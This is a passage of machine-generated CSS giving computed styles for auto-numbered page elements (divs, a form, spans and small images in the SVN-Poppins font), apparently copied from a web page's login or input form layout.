				height: 330.2px;
				inline-size: 534.4px;
				min-block-size: auto;
				min-height: auto;
				min-inline-size: auto;
				min-width: auto;
				padding-block-end: 16px;
				padding-block-start: 16px;
				padding-inline-end: 16px;
				padding-inline-start: 16px;
				perspective-origin: 267.2px 165.1px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				transform-origin: 267.2px 165.1px;
				width: 534.4px;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
				padding: 16px;
			}

			/*#DIV_11*/

			#DIV_11:after {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_11:after*/

			#DIV_11:before {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_11:before*/

			#FORM_12 {
				block-size: 298.2px;
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				height: 298.2px;
				inline-size: 502.4px;
				margin-block-end: 0px;
				perspective-origin: 251.2px 149.1px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				transform-origin: 251.2px 149.1px;
				width: 502.4px;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				margin: 0px;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#FORM_12*/

			#FORM_12:after {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#FORM_12:after*/

			#FORM_12:before {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#FORM_12:before*/

			#DIV_13,
			#DIV_23 {
				align-items: center;
				block-size: 73.6px;
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: flex;
				height: 73.6px;
				inline-size: 502.4px;
				perspective-origin: 251.2px 36.8px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				transform-origin: 251.2px 36.8px;
				width: 502.4px;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_13, #DIV_23*/

			#DIV_13:after,
			#DIV_23:after {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_13:after, #DIV_23:after*/

			#DIV_13:before,
			#DIV_23:before {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_13:before, #DIV_23:before*/

			#DIV_14,
			#DIV_24 {
				block-size: 53.6px;
				border-block-end-color: rgb(241, 243, 245);
				border-block-end-style: solid;
				border-block-end-width: 0.8px;
				border-block-start-color: rgb(241, 243, 245);
				border-block-start-style: solid;
				border-block-start-width: 0.8px;
				border-end-end-radius: 10px;
				border-end-start-radius: 10px;
				border-inline-end-color: rgb(241, 243, 245);
				border-inline-end-style: solid;
				border-inline-end-width: 0.8px;
				border-inline-start-color: rgb(241, 243, 245);
				border-inline-start-style: solid;
				border-inline-start-width: 0.8px;
				border-start-end-radius: 10px;
				border-start-start-radius: 10px;
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				height: 53.6px;
				inline-size: 502.4px;
				margin-block-end: 10px;
				margin-block-start: 10px;
				min-block-size: auto;
				min-height: auto;
				min-inline-size: auto;
				min-width: auto;
				padding-block-end: 10px;
				padding-block-start: 10px;
				padding-inline-end: 10px;
				padding-inline-start: 10px;
				perspective-origin: 251.2px 26.8px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				transform-origin: 251.2px 26.8px;
				width: 502.4px;
				background: rgb(251, 251, 251) none repeat scroll 0% 0% / auto padding-box border-box;
				border: 0.8px solid rgb(241, 243, 245);
				border-radius: 10px;
				font: 16px / 24px SVN-Poppins;
				margin: 10px 0px;
				outline: rgba(0, 0, 0, 0.87) none 0px;
				padding: 10px;
			}

			/*#DIV_14, #DIV_24*/

			#DIV_14:after,
			#DIV_24:after {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_14:after, #DIV_24:after*/

			#DIV_14:before,
			#DIV_24:before {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_14:before, #DIV_24:before*/

			#DIV_15,
			#DIV_25 {
				align-items: center;
				block-size: 32px;
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				bottom: 0px;
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				cursor: text;
				display: inline-flex;
				height: 32px;
				inline-size: 480.8px;
				inset-block-end: 0px;
				inset-block-start: 0px;
				inset-inline-end: 0px;
				inset-inline-start: 0px;
				left: 0px;
				perspective-origin: 240.4px 16px;
				position: relative;
				right: 0px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				top: 0px;
				transform-origin: 240.4px 16px;
				width: 480.8px;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_15, #DIV_25*/

			#DIV_15:after,
			#DIV_25:after {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				cursor: text;
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_15:after, #DIV_25:after*/

			#DIV_15:before,
			#DIV_25:before {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				cursor: text;
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_15:before, #DIV_25:before*/

			#DIV_16,
			#DIV_26 {
				align-items: center;
				block-size: 0.15px;
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				display: flex;
				height: 0.15px;
				inline-size: 23.375px;
				margin-inline-end: 8px;
				max-block-size: 32px;
				max-height: 32px;
				min-block-size: auto;
				min-height: auto;
				min-inline-size: auto;
				min-width: auto;
				perspective-origin: 11.6875px 0.075px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				transform-origin: 11.6875px 0.075px;
				width: 23.375px;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				margin: 0px 8px 0px 0px;
				outline: rgba(0, 0, 0, 0.54) none 0px;
			}

			/*#DIV_16, #DIV_26*/

			#DIV_16:after,
			#DIV_26:after {
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
			}

			/*#DIV_16:after, #DIV_26:after*/

			#DIV_16:before,
			#DIV_26:before {
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
			}

			/*#DIV_16:before, #DIV_26:before*/

			#SPAN_17,
			#SPAN_27 {
				block-size: 23px;
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				display: block;
				height: 23px;
				inline-size: 0px;
				min-block-size: auto;
				min-height: auto;
				min-inline-size: auto;
				min-width: auto;
				perspective-origin: 0px 11.5px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				transform-origin: 0px 11.5px;
				width: 0px;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
			}

			/*#SPAN_17, #SPAN_27*/

			#SPAN_17:after,
			#SPAN_27:after {
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
			}

			/*#SPAN_17:after, #SPAN_27:after*/

			#SPAN_17:before,
			#SPAN_27:before {
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
			}

			/*#SPAN_17:before, #SPAN_27:before*/

			#SPAN_18,
			#SPAN_28 {
				block-size: 23.375px;
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				bottom: 0px;
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				display: block;
				height: 23.375px;
				inline-size: 23.375px;
				inset-block-end: 0px;
				inset-block-start: 0px;
				inset-inline-end: 0px;
				inset-inline-start: 0px;
				left: 0px;
				max-inline-size: 100%;
				max-width: 100%;
				min-block-size: auto;
				min-height: auto;
				min-inline-size: auto;
				min-width: auto;
				perspective-origin: 11.6875px 11.6875px;
				position: relative;
				right: 0px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				top: 0px;
				transform-origin: 11.6875px 11.6875px;
				width: 23.375px;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
				overflow: hidden;
			}

			/*#SPAN_18, #SPAN_28*/

			#SPAN_18:after,
			#SPAN_28:after {
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
			}

			/*#SPAN_18:after, #SPAN_28:after*/

			#SPAN_18:before,
			#SPAN_28:before {
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
			}

			/*#SPAN_18:before, #SPAN_28:before*/

			#SPAN_19,
			#SPAN_29 {
				block-size: 23.375px;
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				display: block;
				height: 23.375px;
				inline-size: 23.375px;
				max-inline-size: 100%;
				max-width: 100%;
				perspective-origin: 11.6875px 11.6875px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				transform-origin: 11.6875px 11.6875px;
				width: 23.375px;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
			}

			/*#SPAN_19, #SPAN_29*/

			#SPAN_19:after,
			#SPAN_29:after {
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
			}

			/*#SPAN_19:after, #SPAN_29:after*/

			#SPAN_19:before,
			#SPAN_29:before {
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
			}

			/*#SPAN_19:before, #SPAN_29:before*/

			#IMG_20,
			#IMG_30 {
				block-size: 23.375px;
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				display: block;
				height: 23.375px;
				inline-size: 23.375px;
				max-inline-size: 100%;
				max-width: 100%;
				perspective-origin: 11.6875px 11.6875px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				transform-origin: 11.6875px 11.6875px;
				width: 23.375px;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
			}

			/*#IMG_20, #IMG_30*/

			#IMG_20:after,
			#IMG_30:after {
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				overflow-clip-margin: content-box;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
				overflow: clip;
			}

			/*#IMG_20:after, #IMG_30:after*/

			#IMG_20:before,
			#IMG_30:before {
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				overflow-clip-margin: content-box;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
				overflow: clip;
			}

			/*#IMG_20:before, #IMG_30:before*/

			#IMG_21,
			#IMG_31 {
				block-size: 23.375px;
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				bottom: 0px;
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				display: block;
				height: 23.375px;
				inline-size: 23.375px;
				inset-block-end: 0px;
				inset-block-start: 0px;
				inset-inline-end: 0px;
				inset-inline-start: 0px;
				left: 0px;
				max-block-size: 100%;
				max-height: 100%;
